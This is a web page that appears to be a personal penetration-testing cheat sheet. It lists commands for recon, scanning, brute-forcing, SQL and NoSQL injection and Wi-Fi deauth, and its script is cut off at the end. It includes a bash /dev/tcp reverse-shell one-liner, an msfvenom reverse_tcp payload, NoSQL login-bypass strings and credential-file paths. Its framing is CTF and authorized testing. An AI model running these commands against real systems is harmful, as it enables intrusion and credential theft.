---
layout: page
title: "CMD"
permalink: /cmd
---




<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>// pentest.ref — command reference</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#0a0d12;
    --panel:#11151d;
    --panel-2:#161c26;
    --line:#212836;
    --text:#e7ebf2;
    --muted:#7d8798;
    --dim:#4c5566;

    --c-recon:#5ec8d8;
    --c-scan:#5b8def;
    --c-web:#f2a541;
    --c-exploit:#ef5b5b;
    --c-post:#b980f0;
    --c-pass:#f5d76e;
    --c-sys:#7fd88f;
    --c-misc:#8b95a7;
    --c-tool:#ff8a5c;
  }
  *{box-sizing:border-box;}
  html{scroll-behavior:smooth;}
  body{
    margin:0;
    background:
      radial-gradient(1200px 600px at 100% -10%, #131a24 0%, transparent 60%),
      var(--bg);
    color:var(--text);
    font-family:'JetBrains Mono', monospace;
    -webkit-font-smoothing:antialiased;
  }
  h1,h2,h3,.display{font-family:'Space Grotesk', sans-serif;}

  /* ===== layout shell ===== */
  .shell{display:grid;grid-template-columns:260px 1fr;min-height:100vh;}
  @media (max-width:900px){.shell{grid-template-columns:1fr;}}

  /* ===== sidebar ===== */
  .sidebar{
    border-right:1px solid var(--line);
    background:var(--panel);
    position:sticky;top:0;height:100vh;overflow-y:auto;
    padding:22px 16px 40px;
  }
  @media (max-width:900px){.sidebar{position:relative;height:auto;border-right:none;border-bottom:1px solid var(--line);}}
  .brand{display:flex;align-items:baseline;gap:8px;margin-bottom:4px;}
  .brand .dot{width:8px;height:8px;border-radius:50%;background:var(--c-exploit);box-shadow:0 0 10px var(--c-exploit);flex:none;}
  .brand h1{font-size:17px;margin:0;letter-spacing:.5px;}
  .brand-sub{color:var(--muted);font-size:11px;margin:2px 0 20px 16px;letter-spacing:.5px;}

  .navgroup-label{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin:18px 0 8px 2px;}
  .navlink{
    display:flex;align-items:center;gap:9px;
    color:var(--muted);text-decoration:none;font-size:12.5px;
    padding:6px 8px;border-radius:6px;margin:1px 0;
    border-left:2px solid transparent;
  }
  .navlink:hover{color:var(--text);background:var(--panel-2);}
  .navlink.active{color:var(--text);background:var(--panel-2);}
  .navlink .sw{width:7px;height:7px;border-radius:2px;flex:none;}

  /* ===== main ===== */
  main{padding:34px clamp(18px,4vw,54px) 100px;max-width:1180px;}

  .topbar{margin-bottom:34px;}
  .kicker{color:var(--c-exploit);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin:0 0 10px;}
  .topbar h2.display{font-size:clamp(26px,4vw,38px);margin:0 0 10px;line-height:1.15;}
  .topbar p{color:var(--muted);font-size:13px;max-width:640px;line-height:1.6;margin:0 0 22px;}

  .searchwrap{
    display:flex;align-items:center;gap:10px;
    background:var(--panel);border:1px solid var(--line);
    border-radius:8px;padding:11px 14px;
  }
  .searchwrap .prompt{color:var(--c-exploit);font-weight:700;}
  .searchwrap input{
    flex:1;background:transparent;border:none;outline:none;
    color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13.5px;
  }
  .searchwrap input::placeholder{color:var(--dim);}
  .cursor{width:7px;height:15px;background:var(--c-exploit);animation:blink 1s step-start infinite;}
  @keyframes blink{50%{opacity:0;}}
  .stat{color:var(--dim);font-size:11px;white-space:nowrap;}

  section.group{margin-top:52px;scroll-margin-top:20px;}
  .group-head{display:flex;align-items:center;gap:12px;margin-bottom:6px;}
  .group-head .idx{color:var(--gc);font-family:'Space Grotesk',sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;}
  .group-head h3{font-size:18px;margin:0;}
  .group-desc{color:var(--muted);font-size:12px;margin:0 0 18px;}
  .group-rule{height:1px;background:linear-gradient(90deg, var(--gc), transparent);margin-bottom:18px;opacity:.5;}

  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px;}

  .card{
    background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--gc);
    border-radius:8px;padding:13px 14px;
    display:flex;flex-direction:column;gap:8px;
  }
  .card .cmdrow{display:flex;align-items:flex-start;gap:8px;}
  .card code{
    font-size:12.5px;color:var(--text);word-break:break-word;line-height:1.5;
    flex:1;
  }
  .card .desc{color:var(--muted);font-size:11.5px;line-height:1.5;}
  .card .example{
    font-size:11px;color:var(--dim);background:#0d1119;border:1px dashed var(--line);
    padding:6px 8px;border-radius:5px;line-height:1.5;word-break:break-word;
  }
  .card .example b{color:var(--c-tool);font-weight:600;}

  .copybtn{
    flex:none;background:var(--panel-2);border:1px solid var(--line);color:var(--muted);
    font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.5px;
    padding:4px 8px;border-radius:5px;cursor:pointer;text-transform:uppercase;
  }
  .copybtn:hover{color:var(--text);border-color:var(--gc);}
  .copybtn.copied{color:var(--c-sys);border-color:var(--c-sys);}

  footer{border-top:1px solid var(--line);margin-top:70px;padding-top:22px;color:var(--dim);font-size:11px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
  .hidden{display:none !important;}
  .no-results{color:var(--dim);font-size:13px;padding:30px 0;text-align:center;display:none;}
</style>
</head>
<body>
<div class="shell">
  <aside class="sidebar" id="sidebar">
    <div class="brand"><span class="dot"></span><h1>pentest.ref</h1></div>
    <div class="brand-sub">command reference // v1</div>
    <div id="navlist"></div>
  </aside>

  <main>
    <div class="topbar">
      <p class="kicker">personal reference — learn · practice · exploit ethically</p>
      <h2 class="display">Penetration Testing<br>Command Reference</h2>
      <p>Every command below is grouped by tool or phase of engagement, with a one-line explanation and, for the deep-dive tools, a worked example. Type below to filter across all sections — click any command to copy it.</p>
      <div class="searchwrap">
        <span class="prompt">$</span>
        <input id="search" type="text" placeholder="filter commands, e.g. 'subdomain' or 'sqlmap'" autocomplete="off">
        <span class="cursor"></span>
        <span class="stat" id="stat"></span>
      </div>
    </div>

    <div id="content"></div>
    <p class="no-results" id="noresults">no commands match that filter.</p>

    <footer>
      <span>built for CTF &amp; authorized engagements only — always get written scope before you run anything above.</span>
      <span id="totalcount"></span>
    </footer>
  </main>
</div>

<script>
/* ============================================================
   DATA — grouped by category. Each group has an id, title,
   a color token, a short description, and a list of commands.
   Deep-dive tool sections include worked "example" fields.
   ============================================================ */
const DATA = [

{ id:"recon", title:"Reconnaissance", color:"--c-recon", desc:"Passive and active information gathering before you touch the target directly.",
  cmds:[
    ["whois <domain>","Domain registration info"],
    ["nslookup <domain>","Basic DNS lookup"],
    ["dig <domain>","Detailed DNS query"],
    ["host <domain>","Quick DNS lookup"],
    ["traceroute <host>","Trace network path to host"],
    ["theHarvester -d <domain> -b all","Harvest emails, subdomains, hosts from public sources"],
    ["crt.sh (browser/API)","Certificate Transparency log search for subdomains"],
    ["whatweb <url>","Identify web technologies in use"],
    ["wpscan --url <url>","WordPress vulnerability scan"],
    ["recon-ng","Full recon framework with modules"],
    ["maltego","Information gathering / OSINT graphing"],
    ["amass enum -d <domain>","Passive + active subdomain enumeration"],
    ["sublist3r -d <domain>","Subdomain listing via multiple sources"]
  ]},

{ id:"scanning", title:"Network Scanning", color:"--c-scan", desc:"Discover live hosts, open ports, and running services.",
  cmds:[
    ["nmap -sn <ip/range>","Ping sweep — host discovery only"],
    ["nmap -sV <ip>","Service and version detection"],
    ["nmap -sS <ip>","Stealth SYN scan"],
    ["nmap -O <ip>","OS detection"],
    ["nmap -A <ip>","Aggressive scan (OS, version, scripts, traceroute)"],
    ["nmap -p- <ip>","Scan all 65535 ports"],
    ["nmap -sC -sV <ip>","Default scripts + version detection"],
    ["nmap -p <port> --script vuln <ip>","Vulnerability detection scripts"],
    ["masscan -p1-65535 <ip> --rate=1000","Very fast full port scan"],
    ["netstat -tuln","List open listening ports locally"],
    ["ss -tuln","Modern replacement for netstat"]
  ]},

{ id:"webapp", title:"Web Application Testing", color:"--c-web", desc:"Enumerate and probe web applications for common vulnerabilities.",
  cmds:[
    ["curl -I <url>","Send HTTP request, view headers only"],
    ["nikto -h <url>","Web vulnerability scan"],
    ["dirb <url>","Directory scan"],
    ["gobuster dir -u <url> -w <wordlist>","Directory brute force"],
    ["hydra -l <user> -P pass.txt <ip> http-post-form","SQL injection / login brute force via form"],
    ["sqlmap -u \"<url>\"","Automated SQL injection testing"],
    ["burpsuite","Web proxy GUI for intercept &amp; manipulate"],
    ["wpscan --url <url>","WordPress scan"],
    ["xsstrike -u <url>","XSS scanner"],
    ["whatweb <url>","Web tech detection"]
  ]},

{ id:"vuln", title:"Vulnerability Assessment", color:"--c-scan", desc:"Structured scanning against known CVEs and misconfigurations.",
  cmds:[
    ["openvas-start","Start OpenVAS vulnerability scanner"],
    ["openvas-setup","Setup OpenVAS"],
    ["nmap --script vuln <ip>","Vulnerability scripts via Nmap NSE"],
    ["searchsploit <keyword>","Search local Exploit-DB mirror"],
    ["msfconsole","Launch Metasploit Framework"],
    ["lynis audit system","Local system security audit"],
    ["nikto -h <url>","Web vulnerability scan"],
    ["whatweb <url>","Web tech detection"],
    ["sslscan <host>","SSL/TLS scan"],
    ["testssl.sh <domain>","SSL/TLS deep scan"],
    ["enum4linux <ip>","SMB enumeration"],
    ["snmpcheck <ip>","SNMP enumeration"]
  ]},

{ id:"exploit", title:"Exploitation", color:"--c-exploit", desc:"Turning a discovered weakness into access.",
  cmds:[
    ["msfconsole","Metasploit console"],
    ["search <exploit>","Search Metasploit modules"],
    ["use <exploit/path>","Load a specific exploit"],
    ["set RHOSTS <ip>","Target IP"],
    ["set LHOST <ip>","Local IP for callback"],
    ["run / exploit","Run the loaded exploit"],
    ["hydra -l <user> -P pass.txt <ip> <service>","Brute force credentials for a service"],
    ["sqlmap -u \"<url>\" --os-shell","SQL injection to OS shell"],
    ["nc -lvnp <port>","Netcat listener"],
    ["nc <ip> <port>","Netcat connect"],
    ["openssl s_client -connect <ip>:<port>","SSL connection test"]
  ]},

{ id:"privesc", title:"Privilege Escalation", color:"--c-post", desc:"Moving from an initial foothold to elevated privileges.",
  cmds:[
    ["sudo -l","Check sudo rights for current user"],
    ["id","User identity and groups"],
    ["whoami","Current user"],
    ["uname -a","System info"],
    ["find / -perm -4000 2&gt;/dev/null","Find SUID binaries"],
    ["linpeas.sh","Automated privilege escalation checks"],
    ["cat /etc/passwd","List system users"],
    ["ps aux","Running processes"],
    ["find / -perm 2000 -o -perm 4000 2&gt;/dev/null","SUID/SGID find variant"],
    ["cat /etc/crontab","Cron jobs"],
    ["env","Environment variables"],
    ["history","Command history"]
  ]},

{ id:"pass", title:"Password Attacks", color:"--c-pass", desc:"Credential cracking and wordlist-driven attacks.",
  cmds:[
    ["hydra -l <user> -P pass.txt &lt;ip&gt;","Password brute force against a service"],
    ["john --wordlist=rockyou.txt hash.txt","John the Ripper wordlist attack"],
    ["hashcat -m 0 hash.txt rockyou.txt","Hashcat cracking (mode 0 = MD5)"],
    ["crunch &lt;min&gt; &lt;max&gt; -o wordlist.txt","Wordlist generator"],
    ["cewl &lt;url&gt; -w wordlist.txt","Wordlist from website content"],
    ["hashid &lt;hash&gt;","Identify hash type"]
  ]},

{ id:"forensics", title:"Forensics", color:"--c-misc", desc:"Analyzing artifacts, memory, and disk images.",
  cmds:[
    ["autopsy","Forensic analysis GUI"],
    ["sleuthkit","Forensic toolkit CLI"],
    ["binwalk &lt;file&gt;","Analyze / extract embedded files"],
    ["foremost &lt;image&gt;","File carving from disk image"],
    ["strings &lt;file&gt;","Extract printable strings"],
    ["exiftool &lt;file&gt;","Metadata extraction"],
    ["dd if=&lt;device&gt; of=&lt;image&gt;","Disk imaging"],
    ["md5sum &lt;file&gt;","MD5 hash"],
    ["sha256sum &lt;file&gt;","SHA256 hash"]
  ]},

{ id:"reporting", title:"Reporting", color:"--c-misc", desc:"Documenting findings for the client / write-up.",
  cmds:[
    ["dradis","Reporting framework"],
    ["maltego","Data visualization for reports"],
    ["faraday","Pen test IDE / collaboration"],
    ["cutycapt --url &lt;url&gt; --out screenshot.png","Web screenshot capture"],
    ["leafpad report.txt","Create report notes"],
    ["pandoc report.md -o report.pdf","Convert markdown to PDF"],
    ["recordmydesktop","Screen recording for PoC"],
    ["obs","Advanced screen recording"]
  ]},

{ id:"system", title:"System &amp; Basic Commands", color:"--c-sys", desc:"Everyday Linux commands used constantly during an engagement.",
  cmds:[
    ["ls -la","List directory contents, incl. hidden"],
    ["cd &lt;dir&gt;","Change directory"],
    ["pwd","Show current directory"],
    ["mkdir &lt;dir&gt;","Create directory"],
    ["rm -rf &lt;dir&gt;","Remove directory (recursive/force)"],
    ["rm &lt;file&gt;","Remove a file"],
    ["cp &lt;src&gt; &lt;dst&gt;","Copy file"],
    ["mv &lt;old&gt; &lt;new&gt;","Move / rename file"],
    ["cat &lt;file&gt;","Display file content"],
    ["nano &lt;file&gt;","Edit file in nano"],
    ["clear","Clear terminal"]
  ]},

{ id:"linux-fs", title:"Linux — Files &amp; Navigation", color:"--c-sys", desc:"Filesystem navigation and manipulation.",
  cmds:[
    ["ls -la","List all files, long format"],
    ["cd ~","Go to home directory"],
    ["cd ..","Go up one directory"],
    ["pwd","Print working directory"],
    ["mkdir test","Create directory"],
    ["rm -r test","Remove directory recursively"],
    ["cp a.txt b.txt","Copy a.txt to b.txt"],
    ["mv old new","Move / rename file"],
    ["touch notes.txt","Create empty file"],
    ["less file","Page through file"],
    ["tail -f log","Follow log live"],
    ["head -f log","Show first lines of file"],
    ["find / -name '*.txt'","Search database of files"],
    ["locate passwd","Search the locate database"],
    ["strings binary","Print printable strings"],
    ["file report.pdf","Determine file type"]
  ]},

{ id:"linux-sys", title:"Linux — System Info &amp; Monitoring", color:"--c-sys", desc:"Understand the box you're standing on.",
  cmds:[
    ["date","Show current date/time"],
    ["uptime","Show current uptime"],
    ["whoami","Current logged in user"],
    ["cat /proc/cpuinfo","CPU info"],
    ["cat /proc/meminfo","Memory info"],
    ["free -h","Memory and swap usage"],
    ["df -h","Disk usage (human readable)"],
    ["du -sh &lt;dir&gt;","Size of a directory"],
    ["uname -a","Kernel / system info"],
    ["hostname","System hostname"],
    ["who","Who is logged in"],
    ["env","Show environment variables"],
    ["echo $PATH","Show PATH variable"]
  ]},

{ id:"linux-net", title:"Linux — Networking", color:"--c-sys", desc:"Local networking commands used constantly on target boxes.",
  cmds:[
    ["ping host","Ping a host"],
    ["whois domain","Domain owner info"],
    ["dig -x 8.8.8.8","Reverse DNS lookup"],
    ["wget url","Download a file"],
    ["wget -c url","Resume interrupted download"],
    ["curl url","Recursively fetch data from a URL"],
    ["curl -O url","Save file with original name"],
    ["curl -i url","Show HTTP headers with response"],
    ["curl -L url","Follow redirects"],
    ["ssh user@host","Connect to host"],
    ["ssh -p 2222 user@host","Connect using a specific port"],
    ["ssh -D 8080 user@host","SOCKS proxy tunnel"],
    ["ip addr / ifconfig","Show IP address info"],
    ["ss -tuln","Show listening ports"]
  ]},

{ id:"linux-perm", title:"Linux — Permissions", color:"--c-sys", desc:"chmod/chown fundamentals for privesc and cleanup.",
  cmds:[
    ["chmod octal file","Change file permissions"],
    ["chmod 777 file","rwx rwx rwx (everyone full access)"],
    ["chmod 755 file","rwx r-x r-x (owner full, others read/execute)"],
    ["chmod 644 file","rw- r-- r-- (owner read/write, others read)"],
    ["chown user file","Change file owner"],
    ["chgrp group file","Change file group"],
    ["4 = read (r), 2 = write (w), 1 = execute (x)","Permission bit reference"]
  ]},

{ id:"linux-cron", title:"Linux — Scheduling (cron)", color:"--c-sys", desc:"Persistence and job scheduling — frequently a privesc vector.",
  cmds:[
    ["crontab -e","Edit cron jobs for current user"],
    ["crontab -l","List cron jobs"],
    ["* * * * * /path/to/script.sh","Cron syntax — min hr day month weekday"],
    ["man crontab","Cron scheduling manual"]
  ]},

{ id:"pkg", title:"Package Management", color:"--c-misc", desc:"Installing tooling on Debian/Ubuntu-based systems.",
  cmds:[
    ["apt update","Update package list"],
    ["apt upgrade","Upgrade installed packages"],
    ["apt install &lt;pkg&gt;","Install package"],
    ["apt remove &lt;pkg&gt;","Remove package"],
    ["dpkg -i &lt;pkg.deb&gt;","Install a .deb package"],
    ["dpkg -r &lt;pkg&gt;","Remove a package"],
    ["dpkg -l","List installed packages"]
  ]},

{ id:"maint", title:"Maintenance &amp; Wireless", color:"--c-misc", desc:"Housekeeping plus wireless attack basics.",
  cmds:[
    ["sudo apt update","Update package list"],
    ["sudo apt upgrade","Upgrade packages"],
    ["sudo apt install &lt;tool&gt;","Install a tool"],
    ["sudo apt remove &lt;tool&gt;","Remove a tool"],
    ["df -h","Disk usage"],
    ["du -sh /","Directory usage"],
    ["free -h","Memory usage"],
    ["journalctl -xe","System logs"],
    ["reboot / shutdown -h now","Restart / shutdown system"],
    ["iwconfig","Wireless interfaces"],
    ["iwlist wlan0 scan","Scan networks"],
    ["airmon-ng start wlan0","Monitor mode"],
    ["aireplay-ng --deauth 0 -a &lt;BSSID&gt; wlan0","Deauth attack"],
    ["aircrack-ng capture.cap -w wordlist.txt","Crack WPA/WPA2 handshake"]
  ]},

{ id:"social", title:"Social Engineering &amp; Files", color:"--c-misc", desc:"Human-layer tooling and the file locations you'll reference constantly.",
  cmds:[
    ["setoolkit","Social Engineering Toolkit"],
    ["gophish","Phishing framework"],
    ["beef-xss","Browser exploitation framework"],
    ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o payload.exe","Create payload"],
    ["/etc/passwd","User accounts"],
    ["/etc/shadow","Password hashes"],
    ["/etc/hosts","Host entries"],
    ["/etc/crontab","Cron jobs"],
    ["/var/log/","Log files"],
    ["~/.bash_history","Command history"],
    ["/root/","Root directory"],
    ["man &lt;command&gt;","Manual pages"],
    ["&lt;command&gt; --help","Command help"],
    ["kali-docs / kali-tools","Kali documentation and tool listing"]
  ]},

/* ================= DEEP DIVE TOOL SECTIONS ================= */

{ id:"tool-nmap", title:"Nmap — Deep Dive", color:"--c-tool", tool:true, desc:"Network mapper: host discovery, port scanning, service/version detection, and NSE scripting.",
  cmds:[
    ["nmap -sV -sC -p- <ip>","Full TCP port scan with default scripts and version detection","nmap -sV -sC -p- 10.10.11.23 — a solid first full scan on a CTF box"],
    ["nmap -sn 192.168.1.0/24","Host discovery / ping sweep across a subnet","nmap -sn 192.168.1.0/24 — find live hosts before scanning individually"],
    ["nmap -sU -p 53,161,500 <ip>","Scan common UDP ports","nmap -sU -p 53,161,500 10.10.11.23 — check DNS/SNMP/IKE over UDP"],
    ["nmap -A -T4 <ip>","Aggressive scan: OS detection, version, scripts, traceroute","nmap -A -T4 10.10.11.23 — quick aggressive recon in one pass"],
    ["nmap --script vuln <ip>","Run the NSE 'vuln' script category","nmap --script vuln 10.10.11.23 — surface known CVEs on open services"],
    ["nmap -p 445 --script smb-vuln* <ip>","Check SMB port for known SMB vulnerabilities","nmap -p 445 --script smb-vuln* 10.10.11.23 — check for EternalBlue etc."],
    ["nmap -sC -sV -oN scan.txt <ip>","Save scan results to a file for later reference","nmap -sC -sV -oN nmap-initial.txt 10.10.11.23"],
    ["nmap -p- --min-rate 5000 <ip>","Fast full port scan at a high packet rate","nmap -p- --min-rate 5000 -oG allports.txt 10.10.11.23"],
    ["nmap --script http-title -p 80,443 <ip>","Grab page titles from web ports","nmap --script http-title -p 80,443 10.10.11.23"],
    ["nmap -sV --version-intensity 9 <ip>","Deep, thorough version detection","nmap -sV --version-intensity 9 -p 22,80 10.10.11.23"]
  ]},

{ id:"tool-gobuster", title:"Gobuster — Deep Dive", color:"--c-tool", tool:true, desc:"Fast directory, DNS, and vhost brute-forcer written in Go.",
  cmds:[
    ["gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt","Directory / file brute force","gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt"],
    ["gobuster dir -u http://<target> -w wordlist.txt -x php,html,txt","Brute force appending common extensions","gobuster dir -u http://target.htb -w big.txt -x php,txt,bak"],
    ["gobuster dns -d <domain> -w subdomains.txt","Subdomain enumeration via DNS brute force","gobuster dns -d target.htb -w subdomains-top1million.txt"],
    ["gobuster vhost -u http://<target> -w vhosts.txt","Virtual host enumeration","gobuster vhost -u http://target.htb -w vhosts.txt --append-domain"],
    ["gobuster dir -u http://<target> -w wordlist.txt -s 200,301,302","Only show specific status codes","gobuster dir -u http://target.htb -w common.txt -s 200,301,302,403"],
    ["gobuster dir -u http://<target> -w wordlist.txt -t 50","Raise thread count for speed","gobuster dir -u http://target.htb -w common.txt -t 50"],
    ["gobuster dir -u https://<target> -w wordlist.txt -k","Skip TLS certificate verification (self-signed certs)","gobuster dir -u https://target.htb -w common.txt -k"],
    ["gobuster fuzz -u http://<target>/FUZZ -w wordlist.txt","Generic FUZZ-keyword based fuzzing mode","gobuster fuzz -u http://target.htb/FUZZ -w common.txt"]
  ]},

{ id:"tool-ffuf", title:"ffuf — Deep Dive", color:"--c-tool", tool:true, desc:"Fast web fuzzer for directories, parameters, vhosts, and form fields.",
  cmds:[
    ["ffuf -u http://<target>/FUZZ -w wordlist.txt","Directory / file fuzzing","ffuf -u http://target.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt"],
    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -mc 200,301,302","Match only specific HTTP status codes","ffuf -u http://target.htb/FUZZ -w common.txt -mc 200,301"],
    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -fs 1234","Filter out responses of a known (boring) size","ffuf -u http://target.htb/FUZZ -w common.txt -fs 1234"],
    ["ffuf -u http://FUZZ.<target> -w subs.txt -H \"Host: FUZZ.<target>\"","Vhost / subdomain fuzzing via Host header","ffuf -u http://FUZZ.target.htb -w subdomains.txt -H \"Host: FUZZ.target.htb\""],
    ["ffuf -u \"http://<target>/?FUZZ=test\" -w params.txt","Parameter name discovery","ffuf -u \"http://target.htb/page?FUZZ=test\" -w param-names.txt"],
    ["ffuf -u http://<target>/login -w pass.txt -X POST -d \"user=admin&pass=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\"","Fuzz a POST body field (e.g. login form password)","ffuf -u http://target.htb/login -w rockyou.txt -X POST -d \"user=admin&pass=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -fc 401"],
    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -recursion -recursion-depth 2","Recurse into discovered directories automatically","ffuf -u http://target.htb/FUZZ -w common.txt -recursion -recursion-depth 2"],
    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -t 100 -rate 200","Tune concurrency and request rate","ffuf -u http://target.htb/FUZZ -w common.txt -t 100 -rate 200"]
  ]},

{ id:"tool-hydra", title:"Hydra — Deep Dive", color:"--c-tool", tool:true, desc:"Parallelized network login cracker supporting dozens of protocols.",
  cmds:[
    ["hydra -l <user> -P rockyou.txt <ip> ssh","SSH password brute force with a single username","hydra -l root -P rockyou.txt 10.10.11.23 ssh"],
    ["hydra -L users.txt -P pass.txt <ip> ftp","FTP brute force using both username and password lists","hydra -L users.txt -P rockyou.txt 10.10.11.23 ftp"],
    ["hydra -l <user> -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"","Brute force a web login form","hydra -l admin -P rockyou.txt 10.10.11.23 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\""],
    ["hydra -l <user> -P pass.txt -t 4 <ip> ssh","Throttle thread count to avoid lockouts / rate limiting","hydra -l root -P rockyou.txt -t 4 10.10.11.23 ssh"],
    ["hydra -l <user> -p <password> <ip> rdp","Test a single known credential pair against RDP","hydra -l administrator -p Winter2024! 10.10.11.23 rdp"],
    ["hydra -L users.txt -P pass.txt -M targets.txt ssh","Brute force the same creds across multiple hosts","hydra -L users.txt -P rockyou.txt -M targets.txt ssh"],
    ["hydra -l <user> -P pass.txt <ip> mysql","MySQL database login brute force","hydra -l root -P rockyou.txt 10.10.11.23 mysql"],
    ["hydra -l <user> -P pass.txt -s 8080 <ip> http-get /admin","Brute force HTTP basic auth on a custom port/path","hydra -l admin -P rockyou.txt -s 8080 10.10.11.23 http-get /admin"]
  ]},

{ id:"tool-nuclei", title:"Nuclei — Deep Dive", color:"--c-tool", tool:true, desc:"Template-driven vulnerability scanner covering CVEs, misconfigs, and exposures.",
  cmds:[
    ["nuclei -u http://<target>","Run the default template set against a single target","nuclei -u http://target.htb"],
    ["nuclei -l urls.txt -o results.txt","Scan a list of URLs and save findings","nuclei -l live-hosts.txt -o nuclei-results.txt"],
    ["nuclei -u http://<target> -t cves/","Run only CVE-tagged templates","nuclei -u http://target.htb -t cves/"],
    ["nuclei -u http://<target> -severity critical,high","Filter results by severity","nuclei -u http://target.htb -severity critical,high"],
    ["nuclei -u http://<target> -tags sqli,xss","Run templates matching specific tags","nuclei -u http://target.htb -tags sqli,xss,lfi"],
    ["nuclei -l urls.txt -c 50","Increase concurrency for faster large scans","nuclei -l live-hosts.txt -c 50"],
    ["nuclei -u http://<target> -t exposures/","Check for exposed panels, keys, and config files","nuclei -u http://target.htb -t exposures/"],
    ["nuclei -update-templates","Pull the latest community template updates","nuclei -update-templates"]
  ]},

{ id:"tool-amass", title:"Amass — Deep Dive", color:"--c-tool", tool:true, desc:"In-depth attack surface mapping and subdomain enumeration (OWASP).",
  cmds:[
    ["amass enum -d <domain>","Passive and active subdomain enumeration","amass enum -d target.com"],
    ["amass enum -passive -d <domain>","Passive-only enumeration using OSINT sources (no direct contact)","amass enum -passive -d target.com -o passive-subs.txt"],
    ["amass enum -d <domain> -o subdomains.txt","Save enumeration results to a file","amass enum -d target.com -o subdomains.txt"],
    ["amass intel -org \"<company name>\"","Discover related domains by organization name","amass intel -org \"Acme Corp\""],
    ["amass enum -d <domain> -brute -w wordlist.txt","Active brute-force subdomain discovery with a wordlist","amass enum -d target.com -brute -w subdomains-top1million.txt"],
    ["amass viz -d3 -d <domain>","Generate a D3 graph visualization of enumeration results","amass viz -d3 -d target.com"]
  ]},

{ id:"tool-penelope", title:"Penelope — Deep Dive", color:"--c-tool", tool:true, desc:"Shell-handler/listener that upgrades and manages reverse shell sessions. Flags vary slightly by version — check `penelope --help` on your install.",
  cmds:[
    ["penelope","Start a Penelope listener with default settings","penelope"],
    ["penelope -p 4444","Listen on a specific port for an incoming shell","penelope -p 4444"],
    ["bash -i >&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1","Classic reverse shell one-liner to catch with Penelope","bash -i >&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1  (run on target, caught by 'penelope -p 4444' on attacker box)"],
    ["penelope -i &lt;session_id&gt;","Interact with a specific captured session","penelope -i 1"],
    ["penelope --help","List all available flags for your installed version","penelope --help"]
  ]},

{ id:"tool-sqlmap", title:"SQLMap — Deep Dive", color:"--c-tool", tool:true, desc:"Automated detection and exploitation of SQL injection flaws.",
  cmds:[
    ["sqlmap -u \"http://<target>/page?id=1\"","Test a GET parameter for SQL injection","sqlmap -u \"http://target.htb/item.php?id=1\""],
    ["sqlmap -u \"http://<target>/page?id=1\" --dbs","Enumerate available databases once injection is confirmed","sqlmap -u \"http://target.htb/item.php?id=1\" --dbs"],
    ["sqlmap -u \"http://<target>/page?id=1\" -D &lt;db&gt; --tables","List tables inside a chosen database","sqlmap -u \"http://target.htb/item.php?id=1\" -D shop --tables"],
    ["sqlmap -u \"http://<target>/page?id=1\" -D &lt;db&gt; -T users --dump","Dump the contents of a specific table","sqlmap -u \"http://target.htb/item.php?id=1\" -D shop -T users --dump"],
    ["sqlmap -u \"http://<target>/login\" --data=\"user=a&amp;pass=b\"","Test POST body parameters for injection","sqlmap -u \"http://target.htb/login\" --data=\"user=admin&amp;pass=test\""],
    ["sqlmap -r request.txt","Test injection using a raw request file saved from Burp","sqlmap -r login-request.txt --batch"],
    ["sqlmap -u \"http://<target>/page?id=1\" --os-shell","Attempt to escalate injection to a full OS shell","sqlmap -u \"http://target.htb/item.php?id=1\" --os-shell"],
    ["sqlmap -u \"http://<target>/page?id=1\" --risk 3 --level 5","Increase test payload thoroughness (slower, more invasive)","sqlmap -u \"http://target.htb/item.php?id=1\" --risk 3 --level 5"],
    ["sqlmap -u \"http://<target>/page?id=1\" --tamper=space2comment","Apply a tamper script to help bypass basic WAF filtering","sqlmap -u \"http://target.htb/item.php?id=1\" --tamper=space2comment"]
  ]},

{ id:"tool-nosqlmap", title:"NoSQLMap — Deep Dive", color:"--c-tool", tool:true, desc:"Automates NoSQL injection testing (primarily MongoDB) plus manual payloads worth knowing by hand.",
  cmds:[
    ["nosqlmap","Launch the interactive menu-driven tool","nosqlmap  (then choose 'Set options' → target IP/port/URI)"],
    ["Set options → target IP / port / URI path","Configure the app under test inside the interactive menu before running attacks","IP: 10.10.11.23, Port: 27017, URI: /login"],
    ["nosqlmap → NoSQL DB Access Attacks","Run automated exploitation mode against the configured MongoDB target","Select menu option 1 after target is set"],
    ["{\"$ne\": null} in a login field","Manual NoSQL auth-bypass payload — matches any non-null value","POST /login  {\"username\":\"admin\",\"password\":{\"$ne\":null}}"],
    ["admin' || 'a'=='a","Manual NoSQL injection string for form fields that get concatenated into a query","Try in a username or search field on a suspected MongoDB backend"],
    ["mongo --host &lt;ip&gt; --port 27017","Connect directly to an exposed MongoDB instance for manual inspection","mongo --host 10.10.11.23 --port 27017 --eval \"db.adminCommand('listDatabases')\""]
  ]}
];

/* ============================================================ */

const navlist = document.getElementById('navlist');
const content = document.getElementById('content');

DATA.forEach(g => {
  // nav link
  const a = document.createElement('a');
  a.href = '#' + g.id;
  a.className = 'navlink';
